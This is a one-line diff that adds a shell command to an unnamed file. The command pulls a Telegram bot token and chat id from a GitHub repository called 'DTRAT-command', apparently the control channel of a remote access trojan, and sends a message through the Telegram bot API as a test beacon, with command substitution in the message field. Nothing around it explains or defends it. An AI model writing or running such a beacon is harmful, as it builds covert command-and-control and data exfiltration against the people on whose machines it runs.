@@ -1,0 +1,1 @@
+curl -s -X POST "https://api.telegram.org/bot$(curl https://raw.githubusercontent.com/paledega/DTRAT-command/master/token)/sendMessage" -F chat_id="$(curl https://raw.githubusercontent.com/paledega/DTRAT-command/master/id)" -F text="$(Deneme)"
